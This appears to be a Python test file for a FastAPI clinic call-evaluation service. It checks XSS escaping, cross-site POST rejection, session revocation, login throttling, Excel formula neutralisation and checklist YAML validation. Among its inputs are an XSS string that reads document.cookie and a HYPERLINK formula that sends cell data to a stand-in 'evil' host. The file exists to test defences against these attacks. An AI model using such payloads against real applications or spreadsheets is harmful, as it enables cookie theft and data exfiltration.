"""Защита и устойчивость: XSS, отзыв сессий, подделка запросов, вкладка другой клиники, Excel, проверка YAML."""

import io

import yaml
from fastapi.testclient import TestClient
from openpyxl import load_workbook
from sqlalchemy import select

from app import db
from app.checklists import load_clinic_checklists

from .conftest import FakeLLM, login
from .test_clinics import criterion, make_two_clinics, scenario_id, upload_text
from .test_web import get_call, make, process_all


def import_yaml(client, data):
    body = yaml.safe_dump(data, allow_unicode=True).encode() if not isinstance(data, bytes) else data
    return client.post("/settings/checklist/import", files=[("file", ("c.yaml", body, "application/x-yaml"))])


# ---------------------------------------------------------------- страницы и формы


def test_no_data_inside_inline_javascript(settings):
    app, client, _, _ = make(settings)
    clinic = app.state.first_clinic_id
    title = "x'); alert(document.cookie); ('"
    client.post("/settings/checklist/sections", data={"title": title, "direction": "in"})
    sid = scenario_id(app, clinic, f"custom_{clinic}_1")
    page = client.get(f"/settings/checklist?section={sid}").text
    assert "onsubmit" not in page and "confirm(" not in page
    assert 'data-confirm="Удалить сценарий «x&#39;); alert(document.cookie); (&#39;»' in page
    assert client.get("/static/app.js").status_code == 200


def test_flash_messages_are_signed(settings):
    app, client, _, _ = make(settings)
    assert "Позвоните по номеру" not in client.get("/calls?err=Позвоните по номеру +7 900").text
    r = client.post("/settings/checklist/weights", data={"high": "nan", "medium": "1", "low": "1"})
    assert "Баллы — числа от 0 до 1000" in r.text  # сообщение, выданное самим сервисом, показывается


def test_cross_site_post_rejected(settings):
    app, client, _, _ = make(settings)
    r = client.post("/settings/clinic", data={"name": "Взлом"}, headers={"origin": "http://evil.example"})
    assert r.status_code == 403
    r = client.post("/login", data={"username": "a", "password": "b"}, headers={"origin": "null"})
    assert r.status_code == 403
    r = client.post("/settings/clinic", data={"name": "Своя"}, headers={"origin": "http://testserver"})
    assert r.status_code == 200 and "сохранены" in r.text


def test_stale_tab_of_another_clinic(settings):
    app, admin, clinic_b = make_two_clinics(settings)  # админ сейчас в клинике Б
    a = app.state.first_clinic_id
    r = admin.post(f"/settings/clinic?_clinic={a}", data={"name": "Имя для А"}, headers={"referer": "http://testserver/settings/clinic"})
    assert "Страница была открыта для другой клиники" in r.text and str(r.url).startswith("http://testserver/settings/clinic")
    with app.state.session_factory() as s:
        assert s.get(db.Clinic, clinic_b).name == "Клиника Б" and s.get(db.Clinic, a).name != "Имя для А"
    r = admin.post(f"/settings/clinic?_clinic={clinic_b}", data={"name": "Клиника Б2"})
    assert "сохранены" in r.text
    # переключение клиники и действия администратора сети отметку не проверяют
    r = admin.post(f"/switch-clinic?_clinic={clinic_b}", data={"clinic_id": str(a)})
    assert "Страница была открыта" not in r.text


def test_unicode_digits_do_not_crash(settings):
    app, client, _, _ = make(settings)
    assert client.get("/calls?employee=²").status_code == 200
    assert client.get("/stats?employee=²").status_code == 200
    r = client.post("/settings/clinic", data={"name": "К", "min_call_seconds": "²"})
    assert r.status_code == 200


# ---------------------------------------------------------------- вход и сессии


def test_sessions_revoked_on_password_change(settings):
    app, admin, clinic_b = make_two_clinics(settings)
    manager = TestClient(app)
    login(manager, "manager_b", "secret-b")
    stolen = manager.cookies.get("ocenka_session")
    with app.state.session_factory() as s:
        manager_id = s.scalars(select(db.User.id).where(db.User.username == "manager_b")).one()
    admin.post(f"/admin/users/{manager_id}", data={"role": "manager", "clinic_id": str(clinic_b), "password": "new-secret", "active": "1"})
    thief = TestClient(app)
    thief.cookies.set("ocenka_session", stolen)
    assert "/login" in str(thief.get("/calls").url)

    # смена своего пароля закрывает другие входы, но не текущий
    login(manager, "manager_b", "new-secret")
    other = TestClient(app)
    login(other, "manager_b", "new-secret")
    r = manager.post("/account/password", data={"old_password": "new-secret", "new_password": "newer-secret", "new_password2": "newer-secret"})
    assert "Пароль изменён" in r.text
    assert manager.get("/calls").status_code == 200 and "/login" not in str(manager.get("/calls").url)
    assert "/login" in str(other.get("/calls").url)

    # «выйти на всех устройствах»
    login(other, "manager_b", "newer-secret")
    manager.post("/account/logout-all")
    assert "/login" in str(other.get("/calls").url)


def test_login_throttle(settings):
    app, client, _, _ = make(settings)
    guest = TestClient(app)
    for _ in range(5):
        assert "Неверный логин или пароль" in guest.post("/login", data={"username": "admin", "password": "wrong"}).text
    r = guest.post("/login", data={"username": "admin", "password": "admin-pass"})
    assert "Слишком много неудачных попыток" in r.text
    # другой логин с того же адреса не заблокирован
    assert "Слишком много" not in guest.post("/login", data={"username": "nobody", "password": "x"}).text


# ---------------------------------------------------------------- выгрузка и карточка


def test_excel_does_not_run_formulas(settings):
    app, client, _, _ = make(settings)
    client.post("/employees", data={"name": '=HYPERLINK("http://evil/?d="&B2,"Подробнее")'})
    with app.state.session_factory() as s:
        emp = s.scalars(select(db.Employee)).first()
    upload_text(client, employee_id=str(emp.id))
    process_all(app)
    wb = load_workbook(io.BytesIO(client.get("/export.xlsx").content))
    cell = wb["Звонки"]["C2"]
    assert cell.value.startswith("=HYPERLINK") and cell.data_type == "s"


def test_card_after_criterion_disabled_and_failed_reevaluation(settings):
    app, client, _, llm = make(settings)
    clinic = app.state.first_clinic_id
    upload_text(client)
    process_all(app)
    g05 = criterion(app, clinic, "G05")
    client.post(f"/settings/checklist/criteria/{g05.id}", data={"text": g05.text, "num": g05.num, "weight": g05.weight_key, "evaluable": ""})
    page = client.get("/calls/1").text
    assert page.count(g05.text) == 1  # пункт с оценкой не дублируется строкой «не оценивается»

    # переоценка не удалась — карточка показывает прежнюю оценку и тип звонка
    llm.raw = ["не json", "не json"]
    client.post("/calls/1/reevaluate")
    process_all(app)
    call = get_call(app)
    assert call.status == db.ERROR and call.call_type == "incoming"
    page = client.get("/calls/1").text
    assert "Входящий звонок" in page and criterion(app, clinic, "IN11").text in page


# ---------------------------------------------------------------- файл чек-листа


def test_yaml_validation(settings):
    app, client, _, _ = make(settings)
    clinic = app.state.first_clinic_id
    base = yaml.safe_load(client.get("/settings/checklist/export.yaml").content.decode("utf-8"))

    def broken(**changes):
        data = yaml.safe_load(yaml.safe_dump(base, allow_unicode=True))
        for path, value in changes.items():
            target = data
            *parents, last = path.split("__")
            for p in parents:
                target = target[int(p)] if p.isdigit() else target[p]
            target[int(last) if last.isdigit() else last] = value
        return data

    cases = [
        (broken(scenarios=[1]), "scenarios"),
        (broken(weights=[1, 2]), "weights"),
        (broken(weights={"high": float("nan"), "medium": 2, "low": 1}), "неотрицательным числом"),
        (broken(weights={"high": -1, "medium": 2, "low": 1}), "неотрицательным числом"),
        (broken(scenarios__incoming__direction="входящий"), "направление"),
        (broken(general__criteria__0__evaluable="false"), "evaluable"),
        (broken(general__criteria__0__id="G 1!"), "Код пункта"),
        ({**base, "scenarios": {**base["scenarios"], "not_target": base["scenarios"]["incoming"]}}, "Ключ сценария"),
        ({**base, "scenarios": {1: base["scenarios"]["incoming"]}}, "Ключ сценария"),
    ]
    before = len(load_clinic_checklists_codes(app, clinic))
    for data, message in cases:
        r = import_yaml(client, data)
        assert r.status_code == 200 and message in r.text, message
    assert len(load_clinic_checklists_codes(app, clinic)) == before

    # коды в нижнем регистре приводятся к верхнему, пустые поля не превращаются в «None»
    data = broken(general__criteria__0__id="g01", general__criteria__0__hint=None, general__criteria__0__num=None)
    data["scenarios"]["incoming"]["description"] = None
    assert "Чек-лист загружен" in import_yaml(client, data).text
    g01 = criterion(app, clinic, "G01")
    assert g01.active and g01.hint == "" and g01.num == ""
    with app.state.session_factory() as s:
        sc = s.get(db.Scenario, scenario_id(app, clinic, "incoming"))
        assert sc.description == ""


def load_clinic_checklists_codes(app, clinic_id):
    with app.state.session_factory() as s:
        cl = load_clinic_checklists(s, clinic_id)
    return [c.id for c in cl.general.criteria] + [c.id for sc in cl.scenarios.values() for c in sc.criteria]


def test_feedback_filters_ignore_code_case():
    from app.evaluation import Evaluator

    ev = Evaluator._build(
        "s",
        ["in01", "in02"],
        {
            "criteria": [{"id": "IN01", "result": "no"}, {"id": "in02", "result": "yes"}],
            "improvements": [{"criterion_id": "In01", "issue": "x", "recommendation": "y"}],
            "strengths": [{"criterion_id": "IN01", "text": "хвалит невыполненное"}, {"criterion_id": "in02", "text": "хорошо"}],
        },
        {"in01": 3, "in02": 1},
    )
    assert [i.criterion_id for i in ev.improvements] == ["in01"]
    assert ev.strengths == ["хорошо"]
